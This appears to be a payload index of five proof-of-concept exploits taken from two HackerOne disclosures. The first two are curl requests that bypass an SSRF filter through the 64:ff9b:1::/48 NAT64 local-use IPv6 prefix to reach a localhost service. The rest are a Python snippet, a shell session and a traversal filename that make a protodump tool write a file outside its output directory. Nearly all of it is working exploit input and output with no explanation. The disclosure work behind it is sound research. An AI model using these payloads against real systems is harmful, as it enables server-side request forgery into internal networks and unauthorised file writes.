# arkadiyt-projects

5 payloads.

### `cd5bc38a`

```
TIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b::7f00:1]:18081'
{"status":"blocked","error":"SsrfFilter::PrivateIPAddress","message":"Hostname '64:ff9b::7f00:1' has no public ip addresses"}%
```

**Parameter:** `url`
— [SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)](https://hackerone.com/reports/3634400) · arkadiyt-projects · [tipsen](https://hackerone.com/tipsen)

### `d349c40a`

```
TIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b:1::7f00:1]:18081'
{"status":"allowed","code":"200","headers":{"content-type":"text/plain","content-length":"24","connection":"close"},"body":"NAT64_PREFIX_BYPASS_DEMO"}%
```

**Parameter:** `url`
— [SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)](https://hackerone.com/reports/3634400) · arkadiyt-projects · [tipsen](https://hackerone.com/tipsen)

### `25394cb9`

```
name = b'../out_pwn/evil.proto'
with open('/tmp/evil.bin', 'wb') as f:
    f.write(bytes([0x0a, len(name)]) + name + b'\x00')
```

— [Path Traversal in writeFile via Unsafe Prefix Containment Check Allows Out-of-Directory Writes](https://hackerone.com/reports/3634571) · arkadiyt-projects · [tipsen](https://hackerone.com/tipsen)

### `7d716a81`

```
TIPSEN:~:% python
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> name = b'../out_pwn/evil.proto'
... with open('/tmp/evil.bin', 'wb') as f:
...     f.write(bytes([0x0a, len(name)]) + name + b'\x00')
...
24
>>> exit
TIPSEN:~:% mkdir -p /tmp/out /tmp/out_pwn
TIPSEN:~:% ls /tmp/out
TIPSEN:~:% ls /tmp/out_pwn
TIPSEN:~:% /tmp/protodump -file /tmp/evil.bin -output /tmp/out
Wrote /tmp/out_pwn/evil.proto
TIPSEN
```

— [Path Traversal in writeFile via Unsafe Prefix Containment Check Allows Out-of-Directory Writes](https://hackerone.com/reports/3634571) · arkadiyt-projects · [tipsen](https://hackerone.com/tipsen)

### `da51972f`

```
../out_pwn/evil.proto
```

— [Path Traversal in writeFile via Unsafe Prefix Containment Check Allows Out-of-Directory Writes](https://hackerone.com/reports/3634571) · arkadiyt-projects · [tipsen](https://hackerone.com/tipsen)
